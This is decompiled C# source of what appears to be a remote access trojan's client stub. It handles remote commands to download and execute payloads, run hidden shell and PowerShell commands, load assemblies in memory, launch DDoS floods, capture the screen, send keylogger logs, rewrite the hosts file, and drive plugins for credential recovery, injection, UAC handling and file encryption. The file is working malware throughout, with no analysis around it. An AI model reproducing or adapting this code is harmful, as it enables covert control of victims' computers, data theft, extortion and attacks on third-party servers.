// Decompiled with JetBrains decompiler
// Type: Stub.Messages
// Assembly: DesignV3Sv, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7FCAC0DD-9A5C-4DA4-BFB3-EE6355E60533
// Assembly location: C:\Users\hadesker\Desktop\Virus\DesignV\DesignV3Sv.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace Stub
{
  public class Messages
  {
    public static string[] Pack;
    public static int RS;
    public static Thread DDos;
    public static Thread ReportWindow;
    public static IntPtr Handle;

    public static void Read(byte[] b)
    {
      try
      {
        string[] strArray = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Settings.SPL);
        string Left = strArray[0];
        if (Operators.CompareString(Left, "pong", false) == 0)
        {
          ClientSocket.ActivatePong = false;
          ClientSocket.Send("pong" + Settings.SPL + Conversions.ToString(ClientSocket.Interval));
          ClientSocket.Interval = 0;
        }
        else if (Operators.CompareString(Left, "rec", false) == 0)
        {
          Helper.CloseMutex();
          Application.Restart();
          Environment.Exit(0);
        }
        else if (Operators.CompareString(Left, "CLOSE", false) == 0)
        {
          ClientSocket.S.Shutdown(SocketShutdown.Both);
          ClientSocket.S.Close();
          Environment.Exit(0);
        }
        else if (Operators.CompareString(Left, "uninstall", false) == 0)
          Uninstaller.UNS(false, (string) null, (byte[]) null);
        else if (Operators.CompareString(Left, "update", false) == 0)
          Uninstaller.UNS(true, strArray[1], Helper.Decompress(Convert.FromBase64String(strArray[2])));
        else if (Operators.CompareString(Left, "DW", false) == 0)
          Messages.RunDisk(strArray[1], Helper.Decompress(Convert.FromBase64String(strArray[2])));
        else if (Operators.CompareString(Left, "FM", false) == 0)
          Messages.Memory(Helper.Decompress(Convert.FromBase64String(strArray[1])));
        else if (Operators.CompareString(Left, "LN", false) == 0)
        {
          try
          {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            ServicePointManager.DefaultConnectionLimit = 9999;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          string fileName = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + strArray[1]);
          new WebClient().DownloadFile(strArray[2], fileName);
          Process.Start(fileName);
        }
        else if (Operators.CompareString(Left, "Urlopen", false) == 0)
          Messages.OpenUrl(strArray[1], false);
        else if (Operators.CompareString(Left, "Urlhide", false) == 0)
          Messages.OpenUrl(strArray[1], true);
        else if (Operators.CompareString(Left, "PCShutdown", false) == 0)
          Interaction.Shell("shutdown.exe /f /s /t 0", AppWinStyle.Hide);
        else if (Operators.CompareString(Left, "PCRestart", false) == 0)
          Interaction.Shell("shutdown.exe /f /r /t 0", AppWinStyle.Hide);
        else if (Operators.CompareString(Left, "PCLogoff", false) == 0)
          Interaction.Shell("shutdown.exe -L", AppWinStyle.Hide);
        else if (Operators.CompareString(Left, "RunShell", false) == 0)
          Interaction.Shell(strArray[1], AppWinStyle.Hide);
        else if (Operators.CompareString(Left, "StartDDos", false) == 0)
        {
          try
          {
            Messages.DDos.Abort();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Messages.DDos = new Thread((ParameterizedThreadStart) (a0 => Messages.TD(Conversions.ToString(a0))));
          Messages.DDos.Start((object) strArray[1]);
        }
        else if (Operators.CompareString(Left, "StopDDos", false) == 0)
        {
          try
          {
            Messages.DDos.Abort();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left, "StartReport", false) == 0)
        {
          try
          {
            Messages.ReportWindow.Abort();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          Messages.ReportWindow = new Thread((ParameterizedThreadStart) (a0 => Messages.Monitoring(Conversions.ToString(a0))));
          Messages.ReportWindow.Start((object) strArray[1]);
        }
        else if (Operators.CompareString(Left, "StopReport", false) == 0)
        {
          try
          {
            Messages.ReportWindow.Abort();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left, "Xchat", false) == 0)
          ClientSocket.Send("Xchat" + Settings.SPL + Helper.ID());
        else if (Operators.CompareString(Left, "Hosts", false) == 0)
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
          ClientSocket.Send("Hosts" + Settings.SPL + Helper.ID() + Settings.SPL + path + Settings.SPL + System.IO.File.ReadAllText(path));
        }
        else if (Operators.CompareString(Left, "Shosts", false) == 0)
        {
          try
          {
            System.IO.File.WriteAllText(strArray[1], strArray[2]);
            ClientSocket.Send("HostsMSG" + Settings.SPL + Helper.ID() + Settings.SPL + "Modified successfully!");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            Exception exception = ex;
            ClientSocket.Send("HostsErr" + Settings.SPL + Helper.ID() + Settings.SPL + exception.Message);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left, "DDos", false) == 0)
          ClientSocket.Send("DDos");
        else if (Operators.CompareString(Left, "plugin", false) == 0)
        {
          Messages.Pack = strArray;
          if (Helper.GetValue(strArray[1]) == null)
            ClientSocket.Send("sendPlugin" + Settings.SPL + strArray[1]);
          else
            Messages.Plugin(Helper.Decompress(Helper.GetValue(strArray[1])));
        }
        else if (Operators.CompareString(Left, "savePlugin", false) == 0)
        {
          byte[] input = Convert.FromBase64String(strArray[2]);
          Helper.SetValue(strArray[1], input);
          Messages.Plugin(Helper.Decompress(input));
        }
        else if (Operators.CompareString(Left, "RemovePlugins", false) == 0)
        {
          MyProject.Computer.Registry.CurrentUser.DeleteSubKey(Helper.PL);
          Messages.SendMSG("Plugins Removed!");
        }
        else if (Operators.CompareString(Left, "OfflineGet", false) == 0)
        {
          ClientSocket.Send("OfflineGet" + Settings.SPL + Helper.ID() + Settings.SPL + System.IO.File.ReadAllText(Settings.LoggerPath));
        }
        else
        {
          if (Operators.CompareString(Left, "$Cap", false) != 0)
            return;
          try
          {
            try
            {
              if (!Helper.ProcessDpi)
              {
                Helper.SetProcessDpiAwareness(2);
                Helper.ProcessDpi = true;
              }
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Rectangle rectangle = Screen.PrimaryScreen.Bounds;
            Bitmap bitmap1 = new Bitmap(rectangle.Width, bounds.Height, PixelFormat.Format16bppRgb555);
            Graphics graphics1 = Graphics.FromImage((Image) bitmap1);
            Size blockRegionSize = new Size(bitmap1.Width, bitmap1.Height);
            graphics1.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
            MemoryStream memoryStream = new MemoryStream();
            Bitmap bitmap2 = new Bitmap(256, 156);
            Graphics graphics2 = Graphics.FromImage((Image) bitmap2);
            Graphics graphics3 = graphics2;
            Bitmap bitmap3 = bitmap1;
            rectangle = new Rectangle(0, 0, 256, 156);
            Rectangle destRect = rectangle;
            Rectangle srcRect = new Rectangle(0, 0, bitmap1.Width, bitmap1.Height);
            graphics3.DrawImage((Image) bitmap3, destRect, srcRect, GraphicsUnit.Pixel);
            bitmap2.Save((Stream) memoryStream, ImageFormat.Jpeg);
            ClientSocket.Send("#CAP" + Settings.SPL + Helper.ID() + Settings.SPL + Convert.ToBase64String(Helper.Compress(memoryStream.ToArray())));
            try
            {
              graphics1.Dispose();
              memoryStream.Dispose();
              bitmap2.Dispose();
              graphics2.Dispose();
              bitmap1.Dispose();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Messages.SendError(ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static void Plugin(byte[] B)
    {
      try
      {
        Type[] types = AppDomain.CurrentDomain.Load(B).GetTypes();
        int index1 = 0;
        while (index1 < types.Length)
        {
          Type type = types[index1];
          if (Operators.CompareString(type.Name, nameof (Plugin), false) == 0)
          {
            MethodInfo[] methods = type.GetMethods();
            int index2 = 0;
            while (index2 < methods.Length)
            {
              object Instance = (object) methods[index2];
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "Run", false))
              {
                NewLateBinding.LateCall(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[5]
                  {
                    (object) Settings.Host,
                    (object) Settings.Port,
                    (object) Settings.SPL,
                    (object) Settings.KEY,
                    (object) Helper.ID()
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null, true);
                return;
              }
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "RunRecovery", false))
              {
                ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject((object) ("Recovery" + Settings.SPL + Helper.ID() + Settings.SPL + Conversions.ToString(Convert.ToInt32(Messages.Pack[2])) + Settings.SPL), NewLateBinding.LateGet(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[1]
                  {
                    (object) Convert.ToInt32(Messages.Pack[2])
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null))));
                return;
              }
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "RunOptions", false))
              {
                string msg = Conversions.ToString(NewLateBinding.LateGet(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[1]
                  {
                    (object) Messages.Pack[2]
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null));
                if (msg.StartsWith("Error"))
                {
                  Messages.SendError(msg);
                  return;
                }
                Messages.SendMSG(msg);
                return;
              }
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "injRun", false))
              {
                if (!System.IO.File.Exists(Messages.Pack[2]))
                  return;
                NewLateBinding.LateCall(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[2]
                  {
                    (object) Messages.Pack[2],
                    (object) Helper.Decompress(Convert.FromBase64String(Messages.Pack[3]))
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null, true);
                return;
              }
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "UACFunc", false))
              {
                Messages.SendError(Conversions.ToString(NewLateBinding.LateGet(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[1]
                  {
                    (object) Convert.ToInt32(Messages.Pack[2])
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null)));
                return;
              }
              if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "ENC", false))
              {
                if (Convert.ToBoolean(Messages.Pack[2]))
                {
                  if (Messages.RS == 1)
                    return;
                  Messages.RS = 1;
                  Messages.SendMSG(Conversions.ToString(NewLateBinding.LateGet(Instance, (Type) null, "Invoke", new object[2]
                  {
                    (object) null,
                    (object) new object[5]
                    {
                      (object) Helper.ID(),
                      (object) Helper.Decompress(Convert.FromBase64String(Messages.Pack[3])),
                      (object) Messages.Pack[4],
                      (object) Messages.Pack[5],
                      (object) Messages.Pack[6]
                    }
                  }, (string[]) null, (Type[]) null, (bool[]) null)));
                  Messages.RS = 2;
                  return;
                }
              }
              else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(Instance, (Type) null, "Name", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (object) "DEC", false) && !Convert.ToBoolean(Messages.Pack[2]))
              {
                if (Messages.RS != 2)
                  return;
                Messages.RS = 1;
                Messages.SendMSG(Conversions.ToString(NewLateBinding.LateGet(Instance, (Type) null, "Invoke", new object[2]
                {
                  (object) null,
                  (object) new object[1]
                  {
                    (object) Helper.ID()
                  }
                }, (string[]) null, (Type[]) null, (bool[]) null)));
                Messages.RS = 0;
                return;
              }
              checked { ++index2; }
            }
          }
          checked { ++index1; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Messages.SendError("Plugin Error! " + ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    public static void SendMSG(string msg)
    {
      try
      {
        ClientSocket.Send("Msg" + Settings.SPL + msg);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void SendError(string msg)
    {
      try
      {
        ClientSocket.Send("Error" + Settings.SPL + msg);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void TD(string Input)
    {
      try
      {
        string host = Input.Split(':')[0];
        string str = Input.Split(':')[1];
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) checked (Convert.ToInt32(Input.Split(':')[2]) * 60));
        Stopwatch stopwatch = new Stopwatch();
        stopwatch.Start();
        while (timeSpan > stopwatch.Elapsed && ClientSocket.isConnected)
        {
          int num = 0;
          do
          {
            new Thread((ThreadStart) (() =>
            {
              try
              {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(host, Convert.ToInt32(str));
                byte[] bytes = Encoding.UTF8.GetBytes("POST / HTTP/1.1\r\nHost: " + host + "\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + Helper.userAgents[new Random().Next(Helper.userAgents.Length)] + "\r\nContent-length: 5235\r\n\r\n");
                socket.Send(bytes, 0, bytes.Length, SocketFlags.None);
                Thread.Sleep(2500);
                socket.Dispose();
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            })).Start();
            checked { ++num; }
          }
          while (num <= 19);
          Thread.Sleep(5000);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Monitoring(string Data)
    {
      List<string> source = new List<string>();
      string[] strArray = Strings.Split(Data, ",");
      int index1 = 0;
      while (index1 < strArray.Length)
      {
        object Instance = (object) strArray[index1];
        source.Add(Conversions.ToString(NewLateBinding.LateGet(Instance, (Type) null, "ToLower", new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
        checked { ++index1; }
      }
      int num = 30;
      while (ClientSocket.isConnected)
      {
        Process[] processes = Process.GetProcesses();
        int index2 = 0;
        while (index2 < processes.Length)
        {
          Process process = processes[index2];
          if (!string.IsNullOrEmpty(process.MainWindowTitle) && source.Any<string>(new Func<string, bool>(process.MainWindowTitle.ToLower().Contains)) && num > 30)
          {
            num = 0;
            Messages.SendMSG("Open [" + process.MainWindowTitle.ToLower() + "]");
          }
          checked { ++index2; }
        }
        checked { ++num; }
        Thread.Sleep(1000);
      }
    }

    public static void OpenUrl(string Url, bool Hidden)
    {
      if (Hidden)
      {
        try
        {
          ServicePointManager.Expect100Continue = true;
          ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
          ServicePointManager.DefaultConnectionLimit = 9999;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(Url);
        httpWebRequest.UserAgent = Helper.userAgents[new Random().Next(Helper.userAgents.Length)];
        httpWebRequest.AllowAutoRedirect = true;
        httpWebRequest.Timeout = 10000;
        httpWebRequest.Method = "GET";
        using ((HttpWebResponse) httpWebRequest.GetResponse())
          ;
      }
      else
        Process.Start(Url);
    }

    [DllImport("avicap32.dll")]
    public static extern IntPtr capCreateCaptureWindowA(
      string lpszWindowName,
      int dwStyle,
      int X,
      int Y,
      int nWidth,
      int nHeight,
      int hwndParent,
      int nID);

    [DllImport("avicap32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern bool capGetDriverDescriptionA(
      short wDriver,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName,
      int cbName,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer,
      int cbVer);

    public static bool Cam()
    {
      try
      {
        int num = 0;
        do
        {
          string str1 = (string) null;
          int wDriver = (int) checked ((short) num);
          string str2 = Strings.Space(100);
          ref string local1 = ref str2;
          ref string local2 = ref str1;
          if (Messages.capGetDriverDescriptionA((short) wDriver, ref local1, 100, ref local2, 100))
            return true;
          checked { ++num; }
        }
        while (num <= 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return false;
    }

    private static void RunDisk(string Extension, byte[] Data)
    {
      object Right = (object) Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Extension);
      System.IO.File.WriteAllBytes(Conversions.ToString(Right), Data);
      Thread.Sleep(500);
      if (Extension.ToLower().EndsWith(".ps1"))
      {
        Process.Start(new ProcessStartInfo("powershell.exe")
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "-ExecutionPolicy Bypass -File \"", Right), (object) "\""))
        });
      }
      else
      {
        Type Type = typeof (Process);
        object[] objArray = new object[1]
        {
          RuntimeHelpers.GetObjectValue(Right)
        };
        object[] Arguments = objArray;
        bool[] flagArray = new bool[1]{ true };
        bool[] CopyBack = flagArray;
        NewLateBinding.LateCall((object) null, Type, "Start", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
        if (!flagArray[0])
          return;
        RuntimeHelpers.GetObjectValue(objArray[0]);
      }
    }

    private static object Memory(byte[] buffer)
    {
      try
      {
        Assembly assembly = AppDomain.CurrentDomain.Load(buffer);
        MethodInfo entryPoint = assembly.EntryPoint;
        object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
        object[] parameters = new object[1];
        if (entryPoint.GetParameters().Length == 0)
          parameters = (object[]) null;
        entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object obj;
      return obj;
    }
  }
}
